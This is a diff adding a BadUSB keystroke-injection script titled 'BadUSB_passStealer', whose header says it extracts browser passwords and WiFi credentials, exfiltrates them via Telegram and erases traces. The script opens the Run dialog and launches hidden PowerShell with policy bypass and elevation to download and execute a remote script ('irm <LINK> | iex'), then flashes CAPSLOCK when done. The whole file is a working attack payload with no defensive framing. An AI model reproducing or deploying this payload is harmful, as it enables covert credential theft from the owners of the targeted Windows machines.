@@ -1,0 +1,51 @@
+REM                      _                        
+REM  _   _  ___  _   _  | | ___ __   _____      __
+REM | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
+REM | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
+REM  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
+REM  |___/                                        
+
+REM ###########################################################
+REM #                                                         #
+REM # Title    : BadUSB_passStealer                           #
+REM # Author   : you.know                                     #
+REM # Version  : 2.0                                          #
+REM # Category : Data Exfiltration, Credential Dumping        #
+REM # Target   : Windows 10/11                                #
+REM #                                                         #
+REM # Description:                                            #
+REM # - Launches PowerShell in hidden mode                    #
+REM # - Extracts browser passwords and WiFi credentials       #
+REM # - Saves them as .txt files                              #
+REM # - Exfiltrates the data via Telegram                     #
+REM # - Cleans up traces after execution                      #
+REM #                                                         #
+REM ###########################################################
+
+REM Initial delay to ensure the system is ready
+DELAY 2500
+
+REM Minimize all active windows
+GUI d
+DELAY 500
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Execute PowerShell hidden with administrative privileges
+STRING powershell -w h -NoP -Ep Bypass -Command "irm <LINK> | iex"
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 500
+ENTER
+
+REM Flash CAPSLOCK as an indicator that execution is complete
+CAPSLOCK
+DELAY 500
+CAPSLOCK
+DELAY 500
+CAPSLOCK
+DELAY 500
+CAPSLOCK
